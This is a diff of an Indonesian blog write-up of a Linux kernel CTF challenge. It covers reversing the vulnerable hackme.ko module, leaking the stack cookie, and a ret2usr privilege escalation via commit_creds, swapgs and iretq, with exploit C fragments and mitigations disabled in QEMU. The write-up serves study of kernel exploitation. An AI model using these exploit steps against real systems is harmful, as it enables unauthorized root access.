@@ -18,7 +18,7 @@ decompress file system menggunakan script yang sudah ada disana.
 
 script yang diperlukan untuk mengcompress dan mendecompress file system:
 
-```
+```bash
 #!/bin/sh
 
 mkdir initramfs
@@ -31,7 +31,7 @@ rm initramfs.cpio
 ```
 
 
-```
+```bash
 #!/bin/sh
 gcc -o fuzz  fuzz.c -static $1
 mv ./fuzz ./initramfs
@@ -45,8 +45,7 @@ mv ./initramfs_updated.cpio.gz ../
 untuk script yang digunakan untuk mengekstrak vmlinuz atau bzImage menjadi vmlinux, saya mendapatkannya <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh">disini</a>
 ekstrak gadget untuk ROP menggunakan tools seperti ROPgadget atau ropper
 
-```
-Bash
+```Bash
 ROPgadget --binary vmlinux > gadget.txt
 ```
 ---
@@ -55,7 +54,7 @@ Reversing
 ---
 tidak ada file sumber yang disediakan dalam tantangan, yang artinya kita harus membongkar module kernel yang rentan tersebut, hackme.ko adalah module yang akan kita eksploitasi kali ini, ketika saya menggunakan radare2. ada beberapa fungsi yang ada didalam module tersebut.
 
-```
+```bash
 0x08000070    1     13 sym.hackme_release
 0x08000080    8    174 sym.hackme_write
 0x08000140    1     13 sym.hackme_open
@@ -66,8 +65,8 @@ tidak ada file sumber yang disediakan dalam tantangan, yang artinya kita harus m
 
 jadi, ayo lihat apa yang ada didalam fungsi hackme_write dan hackme_read
 
-```
-r2 -w hackme.ko
+```bash
+$ r2 -w hackme.ko
 WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
  -- Almost 5am, maybe you should go to bed.
 [0x08000064]> aaa
@@ -96,7 +95,7 @@ INFO: Use -AA or aaaa to perform additional experimental analysis
 
 ```
 
-```
+```bash
 hackme_write
 sym.hackme_write ();
 │           ; var int64_t var_18h @ rbp-0x18
@@ -157,7 +156,7 @@ sym.hackme_write ();
 
 ```
 ini adalah fungsi hackme_read
-```
+```bash
 [0x08000080]> s sym.hackme_read
 [0x08000150]> pdf
 
@@ -217,7 +216,7 @@ sym.hackme_read ();
 ```
 kerentanan yang ada didalam kedua fungsi diatas sangat jelas, pengguna memungkinkan untuk mengirim dan menerima buffer sampai 0x1000(4090) byte, namun jika lebih dari itu, maka fungsi warn_printk akan dipanggil.
 
-```
+```bash
 0x080000a5      4881fa0010   cmp rdx, 0x1000
 0x080000ac      775f           ja 0x800010d
 ```
@@ -226,7 +225,7 @@ kita bisa mengabaikan intruksi yang memanggil fungsi __check_object_size karena 
 
 dan pada baris ini didalam fungsi hackme_write, kernel menyalin dari ruang pengguna ke ruang kernel menggunakan fungsi copy_from_user, biasanya menggunakan ioctl atau write.
 
-```
+```bash
 0x080000c2      4889da         mov rdx, rbx
 0x080000c5      4c89e6         mov rsi, r12
 0x080000c8      48c7c70000..   mov rdi, 0
@@ -256,13 +255,13 @@ kita sudah mengetahui kerentanan pada modul hackme.ko seperti apa, lalu bagaiman
 
 metode dasar untuk melakukan peningkatan hak istimewa di kernel linux adalah menggunakan commit_creds dan prepare_kernel_cred karena ini adalah cara yang sama seperti yang dilakukan kernel saat membuat proses dengan hak akses root. Hal penting lainnya yang harus dilakukan setelah mendapatkan hak akses root adalah kembali ke ruang pengguna. Karena kita sekarang mengeksploitasi modul kernel, konteksnya adalah kernel, tetapi pada akhirnya kita harus kembali ke ruang pengguna dan mengambil shell dengan hak akses root, jadi kita harus kembali ke ruang pengguna tanpa crash. Pertama, mari kita jelaskan bagian teoretis ini.
 
-```
+```bash
 commit_creds(prepare_kernel_cred(0));
 ```
 
 tapi sejak versi kernel 6.2, tidak lagi bisa meneruskan NULL kedalam prepare_kernel_cred, tapi masih bisa dengan cara meneruskan init_cred kedalam commit_creds
 
-```
+```bash
 commit_creds(&init_cred);
 ```
 
@@ -270,7 +269,7 @@ tapi beruntung karena dalam tantangan kita kali ini, versi kernel yang digunakan
 
 baik, kita langsung saja praktekan. tapi sebelum itu kita akan menonaktifkan semua mitigasi seperti SMAP,SMEP,KPTI dan KASLR. buka script run.sh:
 
-```
+```bash
 #!/bin/sh
 qemu-system-x86_64 \
     -m 128M \
@@ -286,7 +285,7 @@ qemu-system-x86_64 \
 
 kita ubah menjadi
 
-```
+```bash
 #!/bin/sh
 qemu-system-x86_64 \
     -m 128M \
@@ -302,7 +301,7 @@ qemu-system-x86_64 \
 
 jangan lupa berikan opsi s dan S untuk memungkinkan kita melakukan debugging pada vmlinux, lalu ubah file /initramfs/etc/inittab:
 
-```
+```bash
 ::sysinit:/etc/init.d/rcS
 ::once:-sh -c 'cat /etc/motd; setuidgid 1000 sh; poweroff'
 
@@ -310,7 +309,7 @@ jangan lupa berikan opsi s dan S untuk memungkinkan kita melakukan debugging pad
 menjadi 
 
 
-```
+```bash
 ::sysinit:/etc/init.d/rcS
 ::once:-sh -c 'cat /etc/motd; setuidgid 0 sh; poweroff'
 ```
@@ -318,7 +317,7 @@ untuk memberikan kita akses root saat debugging, ini penting untuk mencari addre
 
 untuk langkah pertama, ayo kita bocorkan stack cookie terlebih dahulu
 
-```
+```c
 #define _GNU_SOURCE_
 #include<stdio.h>
 #include<stdlib.h>
@@ -364,7 +363,7 @@ int main()
 ```
 sebelum itu, kita harus mengedit file compress.sh. sesuaikan nama exploit.c kita:
 
-```
+```bash
 #!/bin/sh
 gcc -o exploit  exploit.c -static $1
 mv ./exploit ./initramfs
@@ -378,18 +377,18 @@ mv ./initramfs.cpio.gz ../
 
 jalankan dengan cara:
 
-```
+```bash
 ./compress.sh
 ```
 
 setelah itu qemu akan terbuka dan masuk kedalam lingkungan kernel yang berjalan pada busybox, kita cukup jalankan saja:
 
-```
+```bash
 ./exploit
 ```
 offset cookie ada pada offset ke-16, sedangkan alamat basis kernel yang kita bocorkan ada pada offset ke-38
 
-```
+```bash
 / $ ./fuzz
 0: 0xffff88800781f500
 1: 0xffffc900001c7e40
@@ -448,7 +447,7 @@ simplenya semperti ini 0xffffffff8100a157 - 0xa157 = 0xffffffff81000000 (kernel 
 
 selanjutnya, kita harus mengetahui offset commit_creds dan prepare_kernel_creds didalam qemu, jalankan ./run.sh dan ini ketikkan ini: 
 
-```
+```bash
 cat /proc/kallsyms | grep commit_creds
 ffffffff814c6410 T commit_creds
 
@@ -457,12 +456,11 @@ ffffffff814c67f0 T prepare_kernel_cred
 ```
 
 Dalam kondisi eksploitasi saat ini, jika Anda hanya kembali ke userland dengan kode untuk membuka shell, Anda akan kecewa. Alasannya adalah karena setelah menjalankan kode tersebut, kita masih berada dalam mode kernel. Untuk membuka shell root, kita harus kembali ke mode pengguna.
-
-Biasanya, kernel akan kembali ke userland menggunakan salah satu dari instruksi berikut (dalam x86_64): sysretq atau iretq. Cara yang umum digunakan adalah melalui iretq, karena sysretq lebih rumit untuk dilakukan dengan benar. Instruksi iretq hanya membutuhkan tumpukan disiapkan dengan 5 nilai register userland dalam urutan ini: RIP|CS|RFLAGS|SP|SS.
+Biasanya, kernel akan kembali ke userland menggunakan salah satu dari instruksi berikut (dalam x86_64) sysretq atau iretq. Cara yang umum digunakan adalah melalui iretq, karena sysretq lebih rumit untuk dilakukan dengan benar. Instruksi iretq hanya membutuhkan tumpukan disiapkan dengan 5 nilai register userland dalam urutan ini: RIP|CS|RFLAGS|SP|SS.
 
 Proses melacak dua set nilai berbeda untuk register-register ini, satu untuk mode pengguna dan satu untuk mode kernel. Oleh karena itu, setelah selesai mengeksekusi dalam mode kernel, proses harus kembali ke nilai-nilai register mode pengguna. Untuk RIP, kita cukup mengatur ini ke alamat fungsi yang memunculkan shell. Namun, untuk register-register lainnya, jika kita hanya mengaturnya ke nilai acak, proses mungkin tidak melanjutkan eksekusi seperti yang diharapkan. Untuk mengatasi masalah ini, orang-orang telah menemukan cara pintar: simpan status register-register ini sebelum masuk ke mode kernel, lalu muat ulang setelah memperoleh hak akses root. Fungsi untuk menyimpan statusnya adalah sebagai berikut::
 
-```
+```c
 void save_state()
 {
 	__asm__ volatile(
@@ -480,7 +478,7 @@ void save_state()
 ```
 Dan satu hal lagi, pada x86_64, satu instruksi lagi yang disebut swapgsharus dipanggil sebelum iretq. Tujuan dari instruksi ini adalah untuk menukar GS register antara kernel-modedan user-mode. Dengan semua informasi tersebut, kita dapat menyelesaikan kode untuk mendapatkan hak akses root, lalu kembali ke user-mode:
 
-```
+```c
 unsigned long user_rip = (unsigned long)get_shell;
 
 void escalate_privs(void){
@@ -510,25 +508,11 @@ void escalate_privs(void){
 ```
 ketika saya menjalankan kembali exploitnya
 
-```
-/ $ ./fuzz
-[*] Saved state
-[*] payload
-ROOOT
-/ # id
-uid=0 gid=0
-/ # exit
-/ $ exit
-The system is going down NOW!
-Sent SIGTERM to all processes
-Sent SIGKILL to all processes
-Requesting system poweroff
-[   69.619339] reboot: Power down
-```
+<img src="{{ site.url }}{{ site.baseurl }}/images/kernel-rop-root.jpg" alt="">
 
 ini kode lengkapnya
 
-```
+```c
 #define _GNU_SOURCE_
 #include<stdio.h>
 #include<stdlib.h>
@@ -645,6 +629,7 @@ Referensi
 <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a>
 
 <a href="https://y3a.github.io/2021/06/11/hxpctf-kernelrop/">https://y3a.github.io/2021/06/11/hxpctf-kernelrop/</a>
+
 
 <a href="https://lwn.net/Articles/569635/">https://lwn.net/Articles/569635/</a>
 
